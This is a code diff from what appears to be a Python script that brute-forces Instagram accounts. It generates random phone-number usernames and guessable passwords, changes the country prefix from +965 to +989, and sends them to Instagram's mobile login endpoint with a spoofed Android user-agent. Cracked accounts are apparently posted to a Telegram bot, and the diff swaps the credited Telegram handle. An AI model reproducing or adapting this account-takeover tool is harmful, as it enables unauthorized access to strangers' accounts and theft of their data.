@@ -115,8 +115,8 @@ r = requests.Session()
 user = '1234567890'
 while True:	
 	us = str(''.join(random.choice(user)for i in range(6)))
-	username = '+965' + ur + us
-	password =  pa + us
+	username = '+989' + ur + us
+	password = '09' + pa + us
 	cookies = token_hex(8) * 2
 	url='https://i.instagram.com/api/v1/accounts/login/'
 	headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
@@ -169,7 +169,7 @@ while True:
 - 𝗩𝘀 𝗗𝗮𝗧𝗮 : {data8}
 - 𝗩𝘀 𝗛𝗮𝗰𝗞 : {zz}
 • - - - - - - - - - - - - - - - - - - - - - - - - •
-- 𝗙𝗿𝗢𝗺 𝗧𝗲𝗹𝗲 : @VYIYY''')
+- 𝗙𝗿𝗢𝗺 𝗧𝗲𝗹𝗲 : @EE_EEI''')
 		i = requests.post(tlg)
 			
 		print(f"\r \n \033[1;31m - NoT HaCkInG - {aa} :  '\033[1;34m{username}  -  {password} :",end='')
